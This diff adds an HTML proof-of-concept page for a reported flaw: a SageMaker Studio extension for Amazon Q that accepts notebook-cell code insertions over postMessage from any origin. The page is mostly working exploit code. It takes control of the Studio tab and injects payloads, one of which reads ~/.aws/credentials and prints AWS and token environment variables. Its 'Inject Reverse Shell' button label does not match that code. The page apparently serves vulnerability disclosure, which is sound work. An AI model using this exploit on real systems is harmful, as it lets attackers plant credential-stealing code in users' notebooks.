@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Finding 3: Stored XSS via postMessage - insertToCursorPosition</title>
+  <style>
+    body { font-family: monospace; background: #1a1a2e; color: #e0e0e0; padding: 20px; }
+    h1 { color: #ff6b6b; }
+    h2 { color: #ffd93d; }
+    .info { background: #16213e; padding: 15px; border-left: 3px solid #4ecdc4; margin: 10px 0; }
+    .warn { background: #2d1b1b; padding: 15px; border-left: 3px solid #ff6b6b; margin: 10px 0; }
+    button { background: #e94560; color: white; border: none; padding: 12px 24px; cursor: pointer; font-size: 16px; margin: 5px; font-family: monospace; }
+    button:hover { background: #ff6b6b; }
+    button.secondary { background: #0f3460; }
+    button.secondary:hover { background: #16213e; }
+    textarea { width: 100%; height: 120px; background: #16213e; color: #4ecdc4; border: 1px solid #333; padding: 10px; font-family: monospace; font-size: 14px; }
+    #log { background: #0a0a1a; padding: 15px; max-height: 300px; overflow-y: auto; border: 1px solid #333; }
+    .log-entry { margin: 3px 0; font-size: 13px; }
+    .success { color: #4ecdc4; }
+    .error { color: #ff6b6b; }
+    .step { color: #ffd93d; }
+  </style>
+</head>
+<body>
+
+<h1>Finding 3: insertToCursorPosition via postMessage</h1>
+<h2>Amazon Q Chat Extension - No Origin Validation</h2>
+
+<div class="info">
+  <strong>Vulnerability:</strong> The Amazon Q GenAI extension registers a
+  <code>window.addEventListener("message", ...)</code> handler that processes the
+  <code>insertToCursorPosition</code> command without checking <code>event.origin</code>.
+  Any page with a window reference can inject arbitrary code into the active notebook cell.
+</div>
+
+<div class="warn">
+  <strong>Limitation:</strong> The injected code is inserted into the cell but NOT auto-executed.
+  The user must manually run the cell. This is why Finding 3 was downgraded to a code quality issue.
+  However, when chained with social engineering or Finding 4 (file write), impact increases.
+</div>
+
+<h2>Step 1: Open SageMaker Studio</h2>
+<p>Enter your SageMaker Studio URL (the JupyterLab instance):</p>
+<input type="text" id="targetUrl" placeholder="https://xxxxxx.studio.us-east-1.sagemaker.aws/jupyterlab/default/"
+       style="width:100%; padding:10px; background:#16213e; color:#4ecdc4; border:1px solid #333; font-family:monospace; font-size:14px;">
+<br><br>
+<button onclick="openTarget()">Open SageMaker Studio (window.open)</button>
+<button class="secondary" onclick="useOpener()">Use window.opener (if opened from Studio)</button>
+
+<h2>Step 2: Inject Code into Active Cell</h2>
+<p>Code payload to inject via <code>insertToCursorPosition</code>:</p>
+<textarea id="payload"># Injected by example.com via postMessage (Finding 3)
+# No origin validation on insertToCursorPosition handler
+import os, json
+print(f"[XSS PoC] Hostname: {os.uname().nodename}")
+print(f"[XSS PoC] User: {os.environ.get('USER', 'unknown')}")
+print(f"[XSS PoC] CWD: {os.getcwd()}")
+</textarea>
+<br>
+<button onclick="injectCode()">Inject Code into Active Cell</button>
+<button class="secondary" onclick="injectMalicious()">Inject Reverse Shell (demo)</button>
+
+<h2>Event Log</h2>
+<div id="log"></div>
+
+<script>
+  /**
+   * Finding 3 PoC - Hosted on example.com
+   *
+   * Vulnerable sink: @amzn/sagemaker_gen_ai_jupyterlab_extension
+   * File: 930.cac2298840718603025e.js
+   *
+   * The handler accepts postMessage with:
+   *   { command: "insertToCursorPosition", params: { code: "<arbitrary>" } }
+   *
+   * No event.origin check is performed.
+   */
+
+  let targetWindow = null;
+
+  function log(msg, cls = '') {
+    const el = document.getElementById('log');
+    const entry = document.createElement('div');
+    entry.className = 'log-entry ' + cls;
+    entry.textContent = `[${new Date().toISOString()}] ${msg}`;
+    el.appendChild(entry);
+    el.scrollTop = el.scrollHeight;
+  }
+
+  // Approach 1: window.open() to get a reference to the SageMaker tab
+  function openTarget() {
+    const url = document.getElementById('targetUrl').value.trim();
+    if (!url) {
+      log('ERROR: Enter the SageMaker Studio URL first', 'error');
+      return;
+    }
+
+    log(`Opening SageMaker Studio: ${url}`, 'step');
+    // window.open returns a reference we can postMessage to
+    targetWindow = window.open(url, 'sagemaker_studio');
+
+    if (targetWindow) {
+      log('Window opened successfully - got window reference', 'success');
+      log('Wait for JupyterLab to fully load, then click "Inject Code"', 'step');
+    } else {
+      log('Popup blocked! User must allow popups for example.com', 'error');
+      log('Alternative: Use the opener approach if Studio opened this page', 'step');
+    }
+  }
+
+  // Approach 2: If the attacker link was clicked from within SageMaker,
+  // window.opener gives us a reference back to the Studio tab
+  function useOpener() {
+    if (window.opener) {
+      targetWindow = window.opener;
+      log('Found window.opener reference to parent window', 'success');
+      log('Ready to inject code via postMessage', 'success');
+    } else {
+      log('No window.opener available', 'error');
+      log('This page was not opened from SageMaker Studio', 'error');
+      log('Use the window.open approach instead, or chain with Finding 4', 'step');
+    }
+  }
+
+  // Send the insertToCursorPosition postMessage
+  function sendInsertMessage(code) {
+    if (!targetWindow) {
+      log('ERROR: No window reference. Open SageMaker first.', 'error');
+      return;
+    }
+
+    const message = {
+      command: 'insertToCursorPosition',
+      params: {
+        code: code
+      }
+    };
+
+    log(`Sending postMessage from origin: ${window.location.origin}`, 'step');
+    log(`Message: { command: "${message.command}", params: { code: "<${code.length} chars>" } }`, 'step');
+
+    // postMessage with '*' target origin — the handler doesn't check origin anyway
+    try {
+      targetWindow.postMessage(message, '*');
+      log('postMessage sent successfully', 'success');
+      log('Code injected into active notebook cell (if JupyterLab is loaded)', 'success');
+      log('NOTE: User must manually run the cell for code to execute', 'step');
+    } catch (e) {
+      log(`postMessage failed: ${e.message}`, 'error');
+    }
+  }
+
+  // Inject custom code from textarea
+  function injectCode() {
+    const code = document.getElementById('payload').value;
+    sendInsertMessage(code);
+  }
+
+  // Demo: inject a more dangerous payload (non-functional, for demonstration)
+  function injectMalicious() {
+    const payload = [
+      '# === INJECTED BY ATTACKER VIA postMessage ===',
+      '# Finding 3: insertToCursorPosition without origin validation',
+      '# If the user runs this cell, it executes with their permissions',
+      '',
+      'import subprocess, os, json',
+      '',
+      '# Exfiltrate AWS credentials',
+      'try:',
+      '    result = subprocess.run(',
+      '        ["cat", os.path.expanduser("~/.aws/credentials")],',
+      '        capture_output=True, text=True',
+      '    )',
+      '    print(result.stdout)',
+      'except Exception as e:',
+      '    print(f"Error: {e}")',
+      '',
+      '# Exfiltrate environment variables (contains IAM role info)',
+      'for k, v in sorted(os.environ.items()):',
+      '    if "AWS" in k or "SAGE" in k or "TOKEN" in k:',
+      '        print(f"{k}={v}")',
+    ].join('\n');
+
+    sendInsertMessage(payload);
+  }
+
+  // Auto-detect opener on load
+  window.addEventListener('load', () => {
+    log('Finding 3 PoC loaded', 'step');
+    log(`Current origin: ${window.location.origin}`, 'step');
+
+    if (window.opener) {
+      log('Detected window.opener — this page was opened from another tab', 'success');
+      targetWindow = window.opener;
+      log('Auto-acquired target window reference via opener', 'success');
+    }
+  });
+</script>
+
+</body>
+</html>
